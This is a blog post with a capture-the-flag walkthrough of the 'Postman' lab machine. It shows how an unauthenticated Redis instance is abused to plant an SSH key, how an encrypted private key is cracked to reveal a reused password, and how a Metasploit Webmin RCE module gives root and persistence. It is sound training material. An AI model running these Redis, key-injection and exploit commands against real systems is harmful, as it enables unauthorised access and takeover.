---
layout: post
title: "postman"
date: 2025-10-30 
categories: CTF
---
# postman

# Summary

- All port scan to find redis instance
- no authentication required on redis; inject public key in redis’ home directory; login via ssh as redis
- enumerate to find encrypted private key file; use john to convert private to hash; crack hash to reveal Matt’s password
- Matt reused the same password; ssh denied login; can login via su in our valid session with redis
- Matt’s password reused on webmin instance
- exploit webmin authenticated Package Update Module to get reverse shell as root using metasploit

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/postman 10.10.10.160

22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The backend seem to be Ubuntu. Let’s visit the web page first.

## Web

### Port 80

![image.png]({{ site.baseurl }}/assets/postman/image.png)

![image.png]({{ site.baseurl }}/assets/postman/image%201.png)

We know it’s Apache web server and we get the domain name; let’s add that to our /etc/hosts file:

```bash
10.10.10.160 postman.htb
```

Let’s fuzz for subdomains and subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://postman.htb/FUZZ -ic

upload                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 25ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 27ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 1273ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 19ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 18ms]
                        [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 22ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 19ms]
```

Let’s visit /upload:

![image.png]({{ site.baseurl }}/assets/postman/image%202.png)

Let’s also fuzz for .php files:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://postman.htb/FUZZ -ic -e .php
```

Nothing new.

Let’s fuzz for subdomains:

```bash
ffuf -u http://10.10.10.160 -H "Host: FUZZ.postman.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 3844
```

Nothing new. 

### Port 10000

![image.png]({{ site.baseurl }}/assets/postman/image%203.png)

Let’s add Postman to our /etc/hosts as well.

![image.png]({{ site.baseurl }}/assets/postman/image%204.png)

Let’s search up what webmin is:

![image.png]({{ site.baseurl }}/assets/postman/image%205.png)

Let’s see if there are default passwords:

![image.png]({{ site.baseurl }}/assets/postman/image%206.png)

```bash
root:pass
root:filewave
admin:hp.com
admin:admin
root:root
```

None worked. *also do not enter too many attempts as you risk your IP being blacklisted. 

Let’s search for the version of webmin we identified from nmap: MiniServ 1.910. We find this exploit:

https://www.exploit-db.com/exploits/46984

However, we still need a valid login. 

## Port 6379 Foothold

Let’s do a all port scan:

```bash
sudo nmap -p- 10.10.10.160 -v --min-rate=10000

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

```

Let’s scan the redis service with default script:

```bash
sudo nmap -sV -sC -p 6379 -oN nmap/postman2 10.10.10.160

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

```

Redis is a database service.

Let’s try connecting to redis:

```bash
nc 10.10.10.160 6379
```

Let’s see if we need authentication:

![image.png]({{ site.baseurl }}/assets/postman/image%207.png)

Let’s search up exploit related to redis 4.0.9. We find  this https://www.rapid7.com/db/modules/exploit/linux/redis/redis_unauth_exec/

Let’s use msfconsole:

```bash
sudo msfconsole

use linux/redis/redis_replication_cmd_exec
set RHOSTS 10.10.10.160
set LHOST tun0
set SRVHOST tun0
run
```

Did not work. Let’s try another way. We find another exploit here

[https://gist.github.com/ziednamouchi/d9b57abc1834d7ce3cf43d4d74479baa](https://gist.github.com/ziednamouchi/d9b57abc1834d7ce3cf43d4d74479baa)

This exploit essentially just writes our public key into .ssh directory, to permit us ssh access onto the machine as redis user. 

| Step | Command |  |
| --- | --- | --- |
| 1. Find dir | `CONFIG GET dir` | `/var/lib/redis` |
| 2. Set dir | `CONFIG SET dir /var/lib/redis/.ssh` | +OK |
| 3. Set filename | `CONFIG SET dbfilename authorized_keys` | +OK |
| 4. Inject key | `cat pubkey.txt | redis-cli -x set x` |  |
| 5. Save | `SAVE` |  |
| 6. SSH | `ssh -i id_rsa redis@ip` |  |

First, let’s create our public key pair:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f redis
cat redis.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1n7kCzAu1nferyaGk2kgJryHeK92R6xRBrNlDiDXeM kali@kali
```

Now go to redis and into its home dir:

```bash
nc 10.10.10.160

CONFIG GET dir

/var/lib/redis

CONFIG SET dir /var/lib/redis/.ssh

+OK

set new 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1n7kCzAu1nferyaGk2kgJryHeK92R6xRBrNlDiDXeM kali@kali'

+OK

config set dbfilename authorized_keys

+OK

save

+OK
```

Now, let’s try ssh to the machine:

```bash
chmod 600 redis
ssh -i redis redis@10.10.10.160
```

Does not work. Maybe our public keys is not getting saved correctly. 

```bash
cat redis.pub | redis-cli -h 10.10.10.160 -x set new
```

Still does not work. Researching more, turns out, we need to add two line breaks, before and after the public key: https://hackviser.com/tactics/pentesting/services/redis

Let’s add that:

```bash
(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt

```

Now, go back to our redis command line and execute:

```bash
flushall 

CONFIG SET dir /var/lib/redis/.ssh

+OK

config set dbfilename authorized_keys

+OK
```

Now upload our ssh key:

```bash
cat key.txt | redis-cli -h 10.10.10.160 -x set new

OK
```

Now, back on redis:

```bash
#verify our public key is uploaded
get new

#now save it
save
```

Now, let’s try logging in:

```bash
ssh -i redis redis@10.10.10.160
```

We are on:

![image.png]({{ site.baseurl }}/assets/postman/image%208.png)

## Lateral Movement

Let’s start enumerating. We do no have any additional privileges. We see a bash_history file.

```bash
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak
ls -la
exit
cat id_rsa.bak
exit
ls -la
crontab -l
systemctl enable redis-server
redis-server
ifconfig
netstat -a
netstat -a
netstat -a
netstat -a
netstat -a > txt
exit
crontab -l
cd ~/
ls
nano 6379
exit

```

WE don’t see a id_rsa.bak. We also do not see any cron jobs as user redis. Let’s upload linpeas and enumerate the machine:

```bash
#on attack
python3 -m http.server 8001

#on target
wget http://10.10.16.3:8001/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh
```

Intersting:

```bash
OS: Linux version 4.15.0-58-generic (buildd@lcy01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #64-Ubuntu SMP Tue Aug 6 11:12
:41 UTC 2019                                                                                                                                   
User & Groups: uid=107(redis) gid=114(redis) groups=114(redis)                                                                                 
Hostname: Postman   

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.8.21p2

╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
══╣ Cron jobs list
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Aug 25  2019 .
drwxr-xr-x 82 root root 4096 Sep 29  2020 ..
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug 24  2019 popularity-contest

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      647/redis-server 0. 
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      647/redis-server 0. 
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   

╔══════════╣ Users with console
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
root:x:0:0:root:/root:/bin/bash

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lua
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

drwx--x--x 2 root bin 4096 Aug 25  2019 /etc/webmin/software
drwxr-xr-x 2 root root 4096 Aug 25  2019 /usr/share/webmin/authentic-theme/images/modules/software
drwxr-xr-x 3 root root 4096 Aug 25  2019 /usr/share/webmin/blue-theme/software
drwxr-xr-x 3 root root 4096 Aug 25  2019 /usr/share/webmin/gray-theme/software
drwxr-xr-x 5 root root 12288 Aug 25  2019 /usr/share/webmin/software

╔══════════╣ Analyzing SSH Files (limit 70)

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----

```

It seems like we found matt’s private key file. However, we still need the passphrase to be able to use it. Let’s save that to a file on our host. Let’s convert it to john format first:

```bash
ssh2john matt > matt.hash
cat matt.hash 

matt:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63
```

Now, let’s crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt matt.hash

computer2008     (matt)
```

Now, let’s try logging in:

```bash
ssh -i matt matt@postman.htb

Load key "matt": error in libcrypto
```

Maybe our file is not copied correctly. Let’s just download it straight:

```bash
#on target
python3 -m http.server 8000

#on attack
wget http://postman.htb:8000/id_rsa.bak -O matt

chmod 600 matt
```

Now let’s try logging in again.

```bash
Enter passphrase for key 'matt': 
Connection closed by 10.10.10.160 port 22

```

Weird. We seem to pass the authentication but we are getting logged out instantly. Maybe we are in a restricted shell. Let’s try escaping:

```bash
ssh -i matt matt@postman.htb -t "bash --noprofile"

ssh -i matt matt@postman.htb -t "() { :; }; /bin/bash"
```

does not work. Let’s try logging in without the cert. On our ssh session on user redis, let’s just su:

```bash
su Matt
```

We are in.

![image.png]({{ site.baseurl }}/assets/postman/image%209.png)

## Privilege Escalation

We can check we got booted off immediately after we get root.

Let’s enumerate matt. First, let’s check the history files:

```bash
sudo -l
pwd
ls -la
wget https://gist.githubusercontent.com/fabiand/5628006/raw/fe02391084e634092681e3cbe5b7525545f83b84/SimpleHTTPPutServer.py
ls
python SimpleHTTPPutServer.py 8080
mv SimpleHTTPPutServer.py /var/www/html/SimpleHTTPPutServer.py
mv SimpleHTTPPutServer.py /var/www/html/
apt install apache2
su root
mv SimpleHTTPPutServer.py /var/www/html/
su root
cd /var/www/html
ls
python SimpleHTTPPutServer 8080
python -m SimpleHTTPPutServer 8080
service apache2 stop
rm index.html
su root
exit
cd ..
crontab -e
reboot
exit
python -m SimpleHTTPPutServer 8080
python -m SimpleHTTPServer 8080
ls
chmod 700 flag.txt
python server.py 8080
python server.py 127.0.0.1 8080
python server.py 127.0.0.1:8080
mkdir server
mv server server/
ls
mv server.py server/
cd server
ls
cp ../.ssh/id_rsa id_rsa.bak
ls
cd ..
ls
ls -la
passwd
nano server/server.py
python3 server/server.py
nano server/server.py
ssh-keygen
openssl genrsa -des3 -out private.pem 2048
ls
cat private.pem
mv private.pem server/id_rsa.bak
ls
cd server
ls
python3 server.py
python server.py
python server.py 127.0.0.1:8080
su root
ls
nano server.py import sys
nano server.py
python server.py 8080
python server.py 127.0.0.1:8080
ls
service redis restart
su root
ls
echo 'Well Done' > flag.txt
su root
ls
chmod u+s base64
ls -la
crontab -e
exit
cd ~/
ls
cd server
ls
nano reminder
nano justincase.txt
exit
crontab -l
crontab -e
reboot
exit
cd ~/
nano user.txt
rm flag.txt
clear
cd /var/lib/redis
exit
cd ~/
cat user.txt
exit
cd ~/server/
ls
nano justincase.txt
python server.py
python server.py 127.0.0.1:8080
su root
crontab -l
crontab -r
crontab -l
clear
exit
cd /home/Matt
ls -la
cat user.txt
su redis
exit

```

Let’s check our sudo privileges:

```bash
sudo -l

Sorry, user Matt may not run sudo on Postman.
```

Let’s check cron jobs:

```bash
crontab -l

no crontab for Matt
```

Let’s upload pspy and see if there are any cron jobs running:

```bash
./pspy64

2025/10/30 10:15:36 CMD: UID=0     PID=741    | /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf 
2025/10/30 10:15:36 CMD: UID=0     PID=662    | /usr/sbin/apache2 -k start 
```

Let’s see if the password for Matt is reused for the webserver:

```bash
https://Postman:10000

Matt:computer2008
```

![image.png]({{ site.baseurl }}/assets/postman/image%2010.png)

We are logged in.

Searching for webmin 1.910 exploit, we find this: 

https://www.tenable.com/plugins/nessus/146488

We know webmin is running as root, and we have a valid user on webmin. If we are authorised to the Package Update Module (which users are normally allowed) we can execute arbitrary code as root. We find the exploit on metasploit:

```bash
msfconsole 
use exploit/linux/http/webmin_packageup_rce
set USERNAME Matt
set PASSWORD computer2008
set LHOST tun0
set SSL true
set RHOSTS 10.10.10.160
run
```

![image.png]({{ site.baseurl }}/assets/postman/image%2011.png)

We are now root.

We can copy our public key in redis’ .ssh dir to get persistent access to root.

```bash
cp /var/lib/redis/.ssh/authorized_keys /root/.ssh/authorized_keys
chown root:root /root/.ssh/authorized_keys

ls -l /root/.ssh/authorized_keys
```

Now let’s ssh:

```bash
ssh -i redis root@postman.htb
```

![image.png]({{ site.baseurl }}/assets/postman/image%2012.png)

We are now root.

Let’s check the ssh configuration:

```bash
cat /etc/ssh/sshd_config

<SNIP>
#deny users
DenyUsers Matt
```

We get denied by the configuration.